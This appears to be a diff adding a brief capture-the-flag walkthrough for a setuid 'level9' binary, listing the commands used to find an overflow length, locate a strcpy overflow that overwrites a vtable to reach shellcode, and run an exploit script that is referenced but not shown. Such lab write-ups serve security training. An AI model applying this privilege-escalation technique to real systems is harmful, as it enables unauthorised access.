@@ -1,0 +1,31 @@
+level9 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
+
+
+2.
+$ ./level9
+$ ./level9 aaaa
+$ ./level9 $(python -c 'print "A"*109')
+Segmentation fault
+$ ./level9 $(python -c 'print "A"*108')
+
+3. ghidra usage 
+
+find that can overflow the strcpy function to change vtable, which will call the shellcode
+
+4. gdb ./level9
+disas main
+find -> 0x08048670 <+124>:	mov    0x14(%esp),%eax
+x/xw $esp
+get the this address
+
+5. wrote a python script to generate the exploit
+/tmp/exploit9
+<overflow.txt>
+
+6. 
+$ ./level9 $(python /tmp/exploit9)
